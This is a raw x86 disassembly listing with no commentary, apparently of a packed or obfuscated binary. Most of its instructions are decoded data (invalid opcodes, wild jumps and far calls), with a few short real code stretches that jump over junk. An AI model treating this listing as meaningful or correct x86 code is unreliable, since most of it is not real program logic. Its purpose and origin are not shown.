  409db2:	fcomp  DWORD PTR [esi-0x2d00a369]
  409db8:	dec    edi
  409db9:	push   edx
  409dba:	adc    cl,ah
  409dbc:	push   eax
  409dbd:	cmp    bl,al
  409dbf:	adc    eax,0x603f590b
  409dc4:	mov    ah,0xd5
  409dc6:	xchg   edx,eax
  409dc7:	xor    DWORD PTR [ebp-0x41a62f45],esp
  409dcd:	push   esp
  409dce:	leave  
  409dcf:	sar    BYTE PTR [ecx],1
  409dd1:	jge    0x409d53
  409dd3:	jle    0x409dd4
  409dd5:	nop
  409dd6:	not    BYTE PTR [edi-0x25a92dbe]
  409ddc:	adc    DWORD PTR [ecx],0xffffffc6
  409ddf:	mov    WORD PTR [ebx+0x2c],es
  409de2:	adc    al,0xda
  409de4:	fstp   DWORD PTR [edx+0x40]
  409de7:	push   cs
  409de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409de9:	outs   dx,BYTE PTR ds:[esi]
  409dea:	sar    DWORD PTR [ebx-0x2e0523dc],cl
  409df0:	lahf   
  409df1:	ret    
  409df2:	sar    BYTE PTR [ecx-0x6ec721c6],1
  409df8:	add    edi,0xffffffc6
  409dfb:	xchg   ebp,eax
  409dfc:	sbb    ch,dh
  409dfe:	cdq    
  409dff:	xor    ah,BYTE PTR gs:[esi+0x7e]
  409e03:	inc    ebx
  409e04:	in     eax,0x53
  409e06:	pusha  
  409e07:	jmp    0x84a527d6
  409e0c:	stos   DWORD PTR es:[edi],eax
  409e0d:	jg     0x409e63
  409e0f:	dec    dx
  409e11:	fistp  DWORD PTR [edi]
  409e13:	mov    ebp,DWORD PTR [ecx-0x5]
  409e16:	loop   0x409e15
  409e18:	mov    ah,0x54
  409e1a:	push   0x71
  409e1c:	pop    DWORD PTR [esi]
  409e1e:	add    DWORD PTR [ecx-0x27],ecx
  409e21:	outs   dx,DWORD PTR ds:[esi]
  409e22:	push   ds
  409e23:	sub    BYTE PTR [edi-0x56],ch
  409e26:	sbb    DWORD PTR [ebp+0x1cd77e55],ebp
  409e2c:	adc    esi,esp
  409e2e:	lods   eax,DWORD PTR ds:[esi]
  409e2f:	sbb    DWORD PTR [ebp-0x5401ebc1],edi
  409e35:	std    
  409e36:	ja     0x409e71
  409e38:	out    dx,al
  409e39:	mov    eax,ds:0x663aaec9
  409e3e:	mov    WORD PTR [edi+0x615ce647],gs
  409e44:	cld    
  409e45:	cmp    eax,0xb91addba
  409e4a:	inc    ebp
  409e4b:	jnp    0x409e51
  409e4d:	imul   ebx,DWORD PTR [edx-0x47c57190],0x3e
  409e54:	adc    si,WORD PTR [ecx]
  409e57:	nop
  409e58:	push   ss
  409e59:	and    al,0x7e
  409e5b:	std    
  409e5c:	adc    edi,ebp
  409e5e:	fwait
  409e5f:	sbb    edx,ebx
  409e61:	shr    cl,0xec
  409e64:	enter  0x4469,0x2f
  409e68:	jbe    0x409e82
  409e6a:	stos   DWORD PTR es:[edi],eax
  409e6b:	cdq    
  409e6c:	std    
  409e6d:	ds in  eax,dx
  409e6f:	fcom   QWORD PTR [ebx-0x55]
  409e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e73:	jl     0x409e00
  409e75:	out    0x99,al
  409e77:	xor    DWORD PTR [edi],edx
  409e79:	fsubr  QWORD PTR [ebp+0x6183f5c3]
  409e7f:	mov    ebp,0x21380859
  409e84:	ins    BYTE PTR es:[edi],dx
  409e85:	outs   dx,BYTE PTR ds:[esi]
  409e86:	rcl    DWORD PTR [ebp-0x60eba5cc],cl
  409e8c:	xor    eax,0x35b52632
  409e91:	addr16 mov cl,0xca
  409e94:	pop    edi
  409e95:	mov    ds:0x494397a0,al
  409e9a:	sbb    ecx,edi
  409e9c:	sbb    ebx,DWORD PTR [eax-0x2659b1e2]
  409ea2:	or     al,0x30
  409ea4:	push   ecx
  409ea5:	sbb    al,0xfa
  409ea7:	popf   
  409ea8:	mov    edi,edi
  409eaa:	mov    ebx,0xfb3bedff
  409eaf:	adc    eax,0x6bceef0d
  409eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409eb5:	outs   dx,BYTE PTR ds:[esi]
  409eb6:	cli    
  409eb7:	cwde   
  409eb8:	rol    BYTE PTR [esi],cl
  409eba:	aam    0x4a
  409ebc:	mov    ah,al
  409ebe:	add    eax,0xeb541bf7
  409ec3:	push   ebx
  409ec4:	pop    es
  409ec5:	scas   al,BYTE PTR es:[edi]
  409ec6:	mov    dl,0xe0
  409ec8:	loope  0x409f24
  409eca:	cmp    eax,0x2111efe9
  409ecf:	test   DWORD PTR [eax-0x51808f58],esi
  409ed5:	jns    0x409f1a
  409ed7:	and    al,0xa5
  409ed9:	inc    ecx
  409eda:	pop    edx
  409edb:	jg     0x409e5e
  409edd:	mov    esp,0x2fd30d17
  409ee2:	in     eax,0xf1
  409ee4:	mov    ?,WORD PTR [edi-0x6bacba1c]
  409eea:	aas    
  409eeb:	jmp    0x560b86b8
  409ef0:	xor    al,BYTE PTR [eax+ebp*8-0x26]
  409ef4:	push   edx
  409ef5:	popf   
  409ef6:	sbb    al,0x27
  409ef8:	pop    ebp
  409ef9:	push   eax
  409efa:	mov    dh,0xb1
  409efc:	jne    0x409f39
  409efe:	sbb    BYTE PTR [edx+0x1a],0xdf
  409f02:	repnz sahf 
  409f04:	pop    ds
  409f05:	mov    dl,0xaa
  409f07:	inc    eax
  409f08:	xchg   BYTE PTR [edi-0x6f39bbf3],bl
  409f0e:	stc    
  409f0f:	aam    0x49
  409f11:	les    ecx,FWORD PTR [esi+esi*8+0x3652278]
  409f18:	mov    esi,0xfb0c7877
  409f1d:	xchg   ebx,eax
  409f1e:	test   eax,0x3ac03298
  409f23:	push   esi
  409f24:	(bad)  
  409f25:	iret   
  409f26:	arpl   WORD PTR [ebp-0x2a3b5760],sp
  409f2c:	iret   
  409f2d:	idiv   esi
  409f2f:	inc    eax
  409f30:	inc    BYTE PTR [edx]
  409f32:	xchg   ecx,eax
  409f33:	stos   BYTE PTR es:[edi],al
  409f34:	or     ebp,ebp
  409f36:	lea    ebx,[ebx-0x98dfe8f]
  409f3c:	sahf   
  409f3d:	mov    al,0xe3
  409f3f:	push   ebx
  409f40:	push   edi
  409f41:	into   
  409f42:	xchg   ebx,eax
  409f43:	mov    BYTE PTR ds:0x5dbaf6cf,cl
  409f49:	xor    al,0x54
  409f4b:	imul   eax,DWORD PTR [esi-0x5722a58f],0x6a
  409f52:	iret   
  409f53:	(bad)  
  409f54:	icebp  
  409f55:	mov    ecx,0xd57dd4c3
  409f5a:	jmp    0x409f4c
  409f5c:	jecxz  0x409f50
  409f5e:	pop    ebp
  409f5f:	in     eax,dx
  409f60:	call   0x8a8e:0xb396b332
  409f67:	fwait
  409f68:	lods   al,BYTE PTR ds:[esi]
  409f69:	in     eax,0x48
  409f6b:	cmp    ch,BYTE PTR [ecx]
  409f6d:	pop    ds
  409f6e:	mov    esp,DWORD PTR [eax+0xa]
  409f71:	xchg   edi,eax
  409f72:	(bad)  
  409f74:	imul   ebp,ebx,0xf
  409f77:	jl     0x409f9d
  409f79:	jmp    0xaff8284d
  409f7e:	push   es
  409f7f:	mov    al,0x9d
  409f81:	in     al,dx
  409f82:	xor    edx,ebx
  409f84:	jns    0x409fed
  409f86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f87:	sbb    DWORD PTR [edx+0x770f5e38],edx
  409f8d:	jbe    0x409ff0
  409f8f:	ja     0x409ffa
  409f91:	inc    ecx
  409f92:	loope  0x409f5f
  409f94:	inc    ebx
  409f95:	push   ebx
  409f96:	cmp    eax,0x988473bb
  409f9b:	fsubr  DWORD PTR [edx+0x68de1127]
  409fa1:	aad    0x6d
  409fa3:	icebp  
  409fa4:	cld    
  409fa5:	shl    BYTE PTR ds:0x8252f46f,0x6a
  409fac:	cmp    al,BYTE PTR [edx-0x3f]
  409faf:	clc    
  409fb0:	or     esp,DWORD PTR [edx-0x225cee3e]
  409fb6:	sbb    eax,0x9083ed7b
  409fbb:	adc    eax,0xfd2ce24c
  409fc0:	sub    cl,BYTE PTR [edi+ebp*1+0x4dc9aece]
  409fc7:	das    
  409fc8:	or     al,0x42
  409fca:	pop    ebx
  409fcb:	and    eax,0x86c34512
  409fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fd1:	adc    ch,dl
  409fd3:	pop    ss
  409fd4:	xlat   BYTE PTR ds:[ebx]
  409fd5:	sub    al,0xf4
  409fd7:	mov    DWORD PTR [ebx-0x67],esp
  409fda:	mov    BYTE PTR [esp+esi*4-0x1bfd9bac],bl
  409fe1:	ds mov ebp,0xd1b3b51c
  409fe7:	cmp    eax,0x9844da3e
  409fec:	mov    ebp,0x8e7f71ff
  409ff1:	or     BYTE PTR [ebx-0x9],ah
  409ff4:	adc    ebx,DWORD PTR [edi-0x5e0a72d2]
  409ffa:	jmp    0xf1b40526
  409fff:	fsubr  DWORD PTR ds:0x25ec4aae
  40a005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a006:	jmp    0x40a008
  40a008:	pop    edx
  40a009:	mov    ecx,DWORD PTR [ebp-0x10]
  40a00c:	xor    eax,esi
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx+0x6]
  40a02a:	jae    0x409fdb
  40a02c:	pop    esp
  40a02d:	jo     0x40a01d
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	inc    esp
  40a036:	sbb    al,0x3c
  40a038:	adc    DWORD PTR [ecx+0x32013c99],eax
  40a03e:	aad    0x41
  40a040:	mov    cl,0x13
  40a042:	inc    esp
  40a043:	ins    BYTE PTR es:[edi],dx
  40a044:	outs   dx,BYTE PTR ds:[esi]
  40a045:	(bad)  
  40a046:	sbb    DWORD PTR ds:0x759a6c69,ebp
  40a04c:	mov    dl,0xb8
  40a04e:	adc    al,0x1
  40a050:	pop    ecx
  40a051:	call   0xc7d5:0xa0c125c2
  40a058:	iret   
  40a059:	push   ebp
  40a05a:	fidiv  WORD PTR [ebp+0x12d9593d]
  40a060:	or     ch,BYTE PTR [ecx-0x13f6b6d6]
  40a066:	ss test eax,0xbfff9fc6
  40a06c:	jge    0x40a0cc
  40a06e:	or     esi,DWORD PTR [ecx-0x5366d71]
  40a074:	and    ecx,edx
  40a076:	push   0xffffffc4
  40a078:	sub    al,0xa1
  40a07a:	fstp   DWORD PTR [ecx+ebp*8+0x2491d28f]
  40a081:	dec    esp
  40a082:	xor    BYTE PTR [ebx],0xef
  40a085:	ins    BYTE PTR es:[edi],dx
  40a086:	test   eax,0xdec189b1
  40a08b:	addr16 jge 0x40a018
  40a08e:	xor    BYTE PTR [ebp+0x15],al
  40a091:	pop    esp
  40a092:	rcr    BYTE PTR [esi],0xc7
  40a095:	mov    cl,BYTE PTR [esi-0x3f]
  40a098:	gs loope 0x40a02f
  40a09b:	xchg   esp,eax
  40a09c:	and    DWORD PTR ds:0xcf9ef9b5,0xd34b4b2d
  40a0a6:	xchg   edx,eax
  40a0a7:	sbb    DWORD PTR [esi+0x28],edi
  40a0aa:	adc    eax,0x8b228752
  40a0af:	inc    ecx
  40a0b0:	leave  
  40a0b1:	or     DWORD PTR [edx-0x5ebc3be7],esp
  40a0b7:	out    dx,al
  40a0b8:	popa   
  40a0b9:	inc    ebx
  40a0ba:	(bad)  [edi]
  40a0bc:	(bad)  [eax+ebx*1]
  40a0bf:	jns    0x40a0c5
  40a0c1:	pop    esi
  40a0c2:	das    
  40a0c3:	xor    BYTE PTR [esi-0x3a],0xc9
  40a0c7:	fidivr WORD PTR [ebp+0x6e]
  40a0ca:	ja     0x40a050
  40a0cc:	test   eax,0x78155df
  40a0d1:	inc    ecx
  40a0d2:	in     eax,dx
  40a0d3:	test   DWORD PTR [edx-0x17],edi
  40a0d6:	jae    0x40a07f
  40a0d8:	test   eax,0x406414d5
  40a0dd:	fldcw  WORD PTR [edx]
  40a0df:	add    BYTE PTR [edx+0x69],ah
  40a0e2:	mov    ds:0xf244f81a,al
  40a0e7:	pop    eax
  40a0e8:	rcr    dl,0xac
  40a0eb:	push   ecx
  40a0ec:	cmp    al,BYTE PTR [eax+ebx*4]
  40a0ef:	pop    es
  40a0f0:	xchg   edi,eax
  40a0f1:	icebp  
  40a0f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0f3:	pop    ebx
  40a0f4:	rcr    BYTE PTR [edx+edi*8],0x8
  40a0f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0f9:	call   0x47d7c757
  40a0fe:	aaa    
  40a0ff:	push   ds
  40a100:	jl     0x40a0a0
  40a102:	arpl   WORD PTR [esi+0x68],bp
  40a105:	pop    ss
  40a106:	sbb    eax,0x32547bbc
  40a10b:	jae    0x40a09a
  40a10d:	jge    0x40a113
  40a10f:	(bad)  
  40a110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a111:	jp     0x40a153
  40a113:	dec    eax
  40a114:	and    al,0x8
  40a116:	out    0x7a,al
  40a118:	pop    ebx
  40a119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a11a:	(bad)  
  40a11b:	xchg   ebp,eax
  40a11c:	mov    ecx,0x9a93f7e5
  40a121:	jecxz  0x40a194
  40a123:	jo     0x40a152
  40a125:	dec    eax
  40a126:	mov    ebx,0x64d5e3fe
  40a12b:	repnz mov esi,DWORD PTR [edx]
  40a12e:	push   ss
  40a12f:	jno    0x40a14c
  40a131:	and    DWORD PTR [eax+0x46],edi
  40a134:	adc    DWORD PTR [edi],0x164866b6
  40a13a:	loope  0x40a11a
  40a13c:	sbb    al,0x57
  40a13e:	imul   edx,edi,0x183f3897
  40a144:	jne    0x40a0ca
  40a146:	mov    dh,0xbc
  40a148:	jl     0x40a1c3
  40a14a:	adc    dh,BYTE PTR [ebp+esi*8-0x336e7fe2]
  40a151:	retf   
  40a152:	sub    al,0xee
  40a154:	and    cl,BYTE PTR [eax+0x61c3f71b]
  40a15a:	xchg   edx,eax
  40a15b:	sbb    al,BYTE PTR [esp+edx*2]
  40a15e:	push   eax
  40a15f:	lods   al,BYTE PTR ds:[esi]
  40a160:	aas    
  40a161:	inc    ebx
  40a162:	ja     0x40a16b
  40a164:	xor    dl,BYTE PTR [ebx]
  40a166:	xchg   edi,eax
  40a167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a16a:	jne    0x40a1b4
  40a16c:	jmp    0x40a1a1
  40a16e:	sbb    eax,0xd13ce943
  40a173:	push   ss
  40a174:	xor    BYTE PTR [edx+eiz*2],al
  40a177:	loopne 0x40a11b
  40a179:	test   eax,0xe325957a
  40a17e:	loope  0x40a11c
  40a180:	jg     0x40a1e8
  40a182:	outs   dx,DWORD PTR ds:[esi]
  40a183:	loopne 0x40a11f
  40a185:	or     BYTE PTR [ebx-0x8dce2e5],ch
  40a18b:	jns    0x40a133
  40a18d:	dec    ebx
  40a18e:	mov    ebp,esi
  40a190:	push   ecx
  40a191:	pop    edx
  40a192:	and    DWORD PTR [ebx+eax*8-0x3a],0x8bdb8133
  40a19a:	nop
  40a19b:	jge    0x40a156
  40a19d:	popf   
  40a19e:	sahf   
  40a19f:	repnz mov ecx,0x52b4668e
  40a1a5:	xor    al,0xc
  40a1a7:	retf   0x6670
  40a1aa:	cs dec esp
  40a1ac:	test   DWORD PTR [ecx],esi
  40a1ae:	in     eax,dx
  40a1af:	mov    ch,0x91
  40a1b2:	mov    ecx,0xad2c974b
  40a1b7:	pop    edx
  40a1b8:	mov    eax,0x2f74b8d0
  40a1bd:	inc    eax
  40a1be:	imul   esi,ecx,0xffffffae
  40a1c1:	rcr    BYTE PTR [edi+0x74ca951e],1
  40a1c7:	jmp    DWORD PTR [esp+ebp*8-0x13]
  40a1cb:	dec    edx
  40a1cc:	lock jmp ecx
  40a1cf:	out    0x99,eax
  40a1d1:	cli    
  40a1d2:	and    eax,0xbfbc26c5
  40a1d7:	add    al,0x37
  40a1d9:	arpl   WORD PTR [edi],bx
  40a1db:	xor    ebx,DWORD PTR [eax-0x250e62ce]
  40a1e1:	repz sub DWORD PTR [eax-0x7d0d7cb0],esi
  40a1e8:	and    eax,0xb6dd7d0a
  40a1ed:	inc    eax
  40a1ee:	add    BYTE PTR [edx+0xdf6f9fd],0x22
  40a1f5:	cdq    
  40a1f6:	mov    ch,BYTE PTR [esp-0x34f488ce]
  40a1fd:	and    BYTE PTR [edi-0x20],dh
  40a200:	jge    0x40a1d4
  40a202:	dec    edi
  40a203:	out    dx,al
  40a204:	push   ebp
  40a205:	fisubr WORD PTR [esi-0x1c]
  40a208:	and    eax,0x6f125eee
  40a20d:	push   ecx
  40a20e:	ror    BYTE PTR [esi+0x2d],cl
  40a211:	lods   al,BYTE PTR ds:[esi]
  40a212:	inc    eax
  40a213:	push   es
  40a214:	mov    dl,0xfc
  40a216:	adc    dl,BYTE PTR [ecx]
  40a218:	or     esp,DWORD PTR [edx+eiz*4-0x7a]
  40a21c:	call   0x72a0dfe6
  40a221:	mov    ecx,0xd703ce37
  40a226:	(bad)  
  40a227:	div    cl
  40a229:	jecxz  0x40a1d0
  40a22b:	fs cld 
  40a22d:	push   eax
  40a22e:	shl    DWORD PTR [ebx],0x64
  40a231:	sbb    BYTE PTR [esi],ah
  40a233:	shr    ecx,0x44
  40a236:	fwait
  40a237:	stc    
  40a238:	das    
  40a239:	pop    es
  40a23a:	popf   
  40a23b:	mov    esp,esp
  40a23d:	add    DWORD PTR [esp+eiz*8-0x2d],esi
  40a241:	dec    ebx
  40a242:	cmp    esp,esi
  40a244:	push   edi
  40a245:	fst    DWORD PTR [esi+ecx*4-0x18cef761]
  40a24c:	retf   
  40a24d:	js     0x40a202
  40a24f:	cmp    eax,0x568f4f05
  40a254:	or     esp,DWORD PTR [eax]
  40a256:	xchg   esi,eax
  40a257:	sub    eax,0xa0593ced
  40a25c:	pop    esp
  40a25d:	daa    
  40a25e:	sub    edi,edx
  40a260:	ret    0x6ec4
  40a263:	or     BYTE PTR [ebx+ebp*2+0x75],bh
  40a267:	clc    
  40a268:	hlt    
  40a269:	inc    ebp
  40a26a:	pop    edx
  40a26b:	retf   0xdbb9
  40a26e:	or     bh,BYTE PTR [ebx-0x70c20ac6]
  40a274:	pop    esp
  40a275:	loop   0x40a2b7
  40a277:	cmp    eax,0x86a03c78
  40a27c:	pop    ecx
  40a27d:	nop
  40a27e:	xchg   edi,eax
  40a27f:	push   ds
  40a280:	mov    ds:0xb029f926,eax
  40a285:	test   DWORD PTR [ebx+0x400dcb2d],0xd40409cc
  40a28f:	jae    0x40a219
  40a291:	ins    BYTE PTR es:[edi],dx
  40a292:	or     edi,esi
  40a294:	cmp    DWORD PTR [ebx*4-0x74b2680e],edx
  40a29b:	jne    0x40a2bf
  40a29d:	inc    esi
  40a29e:	xor    eax,0x9108ccd2
  40a2a3:	retf   0x380e
  40a2a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2a7:	test   eax,0x5ef54bef
  40a2ac:	scas   eax,DWORD PTR es:[edi]
  40a2ad:	xor    al,BYTE PTR [eax]
  40a2af:	popf   
  40a2b0:	repz fcmove st,st(0)
  40a2b3:	test   al,0xce
  40a2b5:	rcr    ecx,cl
  40a2b7:	scas   eax,DWORD PTR es:[edi]
  40a2b8:	daa    
  40a2b9:	cld    
  40a2ba:	repz js 0x40a29f
  40a2bd:	pop    ss
  40a2be:	hlt    
  40a2bf:	mov    ss,WORD PTR [eax+ebx*8+0xb]
  40a2c3:	fcom   st(0)
  40a2c5:	iret   
  40a2c6:	int3   
  40a2c7:	fidivr WORD PTR [ebp+0x30284851]
  40a2cd:	(bad)  
  40a2ce:	fwait
  40a2cf:	pop    esp
  40a2d0:	mov    eax,0x5321d54a
  40a2d5:	sub    al,0x4d
  40a2d7:	mov    edi,0xdb5a1fc1
  40a2dc:	push   es
  40a2dd:	adc    eax,0x108195a5
  40a2e2:	bound  edi,QWORD PTR [edx+eax*8]
  40a2e5:	cmp    edx,edx
  40a2e7:	dec    edx
  40a2e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2e9:	mov    WORD PTR [ebp-0x37],ds
  40a2ec:	shl    DWORD PTR [eax-0x1d],cl
  40a2ef:	sub    eax,0x3d906569
  40a2f4:	inc    ebx
  40a2f5:	push   0x2f
  40a2f7:	push   eax
  40a2f8:	cdq    
  40a2f9:	cdq    
  40a2fa:	out    dx,eax
  40a2fb:	adc    eax,0x14851939
  40a300:	xchg   ecx,eax
  40a301:	pop    es
  40a302:	push   ecx
  40a303:	cdq    
  40a304:	in     eax,dx
  40a305:	in     al,dx
  40a306:	out    dx,eax
  40a307:	(bad)  
  40a308:	sbb    al,0x17
  40a30a:	or     cl,0xf2
  40a30d:	inc    esi
  40a30e:	add    al,0x22
  40a310:	mov    bh,BYTE PTR [ecx]
  40a312:	hlt    
  40a313:	aam    0x16
  40a315:	push   0xd5974b8c
  40a31a:	mov    ebp,0x57323b1d
  40a31f:	int    0x8f
  40a321:	xor    edx,ecx
  40a323:	dec    ebp
  40a324:	sub    ch,BYTE PTR [ebp-0x7d]
  40a327:	push   eax
  40a328:	ja     0x40a2c3
  40a32a:	ins    BYTE PTR es:[edi],dx
  40a32b:	not    BYTE PTR [edx+0x7d1d70bd]
  40a331:	test   al,0xca
  40a333:	fld    DWORD PTR es:[eax+0x33e42b60]
  40a33a:	into   
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	inc    esi
  40a3cc:	(bad)
  40a3d1:	jle    0x40a451
  40a3d3:	jp     0x40a452
  40a3d5:	jle    0x40a455
  40a3d7:	push   eax
  40a3d8:	add    bh,ch
  40a3da:	jns    0x40a40c
  40a3dc:	xchg   esp,eax
  40a3dd:	dec    esp
  40a3de:	mov    bh,0xdc
  40a3e0:	fcmovb st,st(5)
  40a3e2:	test   eax,0xf1ca0189
  40a3e7:	fs xchg esp,eax
  40a3e9:	rcr    edx,1
  40a3eb:	fbstp  TBYTE PTR [eax+0x7da7f84]
  40a3f1:	mov    eax,DWORD PTR [eax-0xe]
  40a3f4:	mov    esi,0x41d585d8
  40a3f9:	push   ds
  40a3fa:	enter  0xa3ed,0xe6
  40a3fe:	pop    ebp
  40a3ff:	or     BYTE PTR [eax],ch
  40a401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a402:	pop    ebp
  40a403:	and    eax,0x5e34ee76
  40a408:	add    ebx,DWORD PTR [eax-0x42]
  40a40b:	in     eax,0xe7
  40a40d:	in     al,0xb7
  40a40f:	lea    esi,[ebp+0x53]
  40a412:	cmovbe esp,DWORD PTR [ecx]
  40a415:	(bad)  [eax+0x43]
  40a418:	fst    QWORD PTR [ebp+0x7f]
  40a41b:	cwde   
  40a41c:	ror    DWORD PTR [esi+esi*8-0x7473c944],0x6c
  40a424:	fnstcw WORD PTR [edx]
  40a426:	pop    edx
  40a427:	sub    edx,DWORD PTR [eax-0x21]
  40a42a:	push   ebp
  40a42b:	(bad)  
  40a42c:	jnp    0x40a431
  40a42e:	imul   ebp,DWORD PTR [ebx+ebp*8+0x68],0x345264e3
  40a436:	cmp    eax,DWORD PTR [edi]
  40a438:	or     cl,BYTE PTR [ebp-0x5036c9e5]
  40a43e:	xchg   esp,eax
  40a43f:	mov    dl,al
  40a441:	adc    cl,BYTE PTR [edx-0x42272da0]
  40a447:	jmp    0x40a41d
  40a449:	sbb    BYTE PTR [ebp+0x48],ah
  40a44c:	scas   al,BYTE PTR es:[edi]
  40a44d:	inc    esi
  40a44e:	test   eax,0xf1b91ced
  40a453:	call   0x302ee21d
  40a458:	pusha  
  40a459:	jle    0x40a446
  40a45b:	shl    ebp,cl
  40a45d:	fistp  WORD PTR [eax-0x7f894681]
  40a463:	adc    BYTE PTR [edi+0x7a425915],al
  40a469:	lods   eax,DWORD PTR ds:[esi]
  40a46a:	ds dec ebx
  40a46c:	test   eax,ecx
  40a46e:	lahf   
  40a46f:	jecxz  0x40a488
  40a471:	xor    BYTE PTR [ebp+0x62],0xe8
  40a475:	lahf   
  40a476:	into   
  40a477:	xor    dl,BYTE PTR [edx+0x7c]
  40a47a:	(bad)  
  40a47b:	cmp    al,0xed
  40a47d:	sub    cl,BYTE PTR [eax]
  40a47f:	retf   0xa888
  40a482:	in     al,dx
  40a483:	or     esi,DWORD PTR [edx+0x1812eabb]
  40a489:	and    eax,edi
  40a48b:	mov    ebx,0x9aca08be
  40a490:	xor    cl,BYTE PTR [edi+0x1be65285]
  40a496:	pop    eax
  40a497:	dec    esi
  40a498:	js     0x40a439
  40a49a:	(bad)  
  40a49b:	and    ebp,DWORD PTR [edx]
  40a49d:	clc    
  40a49e:	mov    WORD PTR [edx+eiz*8],?
  40a4a1:	aam    0xb3
  40a4a3:	inc    eax
  40a4a4:	popf   
  40a4a5:	test   dl,ah
  40a4a7:	xlat   BYTE PTR ds:[ebx]
  40a4a8:	adc    BYTE PTR [ebx],ch
  40a4aa:	stos   BYTE PTR es:[edi],al
  40a4ab:	leave  
  40a4ac:	push   edx
  40a4ad:	push   ecx
  40a4ae:	fwait
  40a4af:	cmp    BYTE PTR [edi],ah
  40a4b1:	sub    cl,0x2b
  40a4b4:	aam    0x1d
  40a4b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4b7:	fcom   QWORD PTR [esi+ecx*8+0x60]
  40a4bb:	repz shr edi,cl
  40a4be:	into   
  40a4bf:	fst    QWORD PTR [ebx-0x36]
  40a4c2:	(bad)  
  40a4c3:	push   eax
  40a4c4:	cmp    BYTE PTR [ebx+0x12],dh
  40a4c7:	test   eax,0x9f520f7b
  40a4cc:	mov    ebp,0x2dff201e
  40a4d1:	pop    ss
  40a4d2:	mov    esp,DWORD PTR [edi+0x2d]
  40a4d5:	pop    esi
  40a4d6:	adc    DWORD PTR [ebp-0x55],ebp
  40a4d9:	fcomp  QWORD PTR [ebp-0x11]
  40a4dc:	cld    
  40a4dd:	or     eax,0xcb5b7be6
  40a4e2:	das    
  40a4e3:	stos   DWORD PTR es:[edi],eax
  40a4e4:	and    bl,BYTE PTR [edi+0x192f23b9]
  40a4ea:	pop    eax
  40a4eb:	pop    esi
  40a4ec:	ins    BYTE PTR es:[edi],dx
  40a4ed:	push   es
  40a4ee:	mov    ecx,0x4b58a078
  40a4f3:	dec    ecx
  40a4f4:	mov    ecx,0x6271199
  40a4f9:	les    eax,FWORD PTR [esi+ebp*2]
  40a4fc:	fidiv  WORD PTR [ebp-0x9e8c845]
  40a502:	in     eax,0x87
  40a504:	push   ecx
  40a505:	adc    DWORD PTR [ebp+0x5cc10701],edi
  40a50b:	mov    ds:0x31d0a965,al
  40a510:	mov    bl,0xc4
  40a512:	sbb    bl,BYTE PTR [ecx+ebp*1]
  40a515:	das    
  40a516:	jge    0x40a55f
  40a518:	push   ecx
  40a519:	mov    al,0xc2
  40a51b:	(bad)  
  40a51d:	mov    BYTE PTR [edx],ah
  40a51f:	test   DWORD PTR [ebx],ecx
  40a521:	popf   
  40a522:	lods   al,BYTE PTR ds:[esi]
  40a523:	dec    DWORD PTR [eax+edi*8+0x4125fbc8]
  40a52a:	push   0x8
  40a52c:	pop    esp
  40a52d:	(bad)  
  40a52e:	ret    
  40a52f:	sub    eax,0x6cd0b0c8
  40a534:	or     al,0x6d
  40a536:	inc    ecx
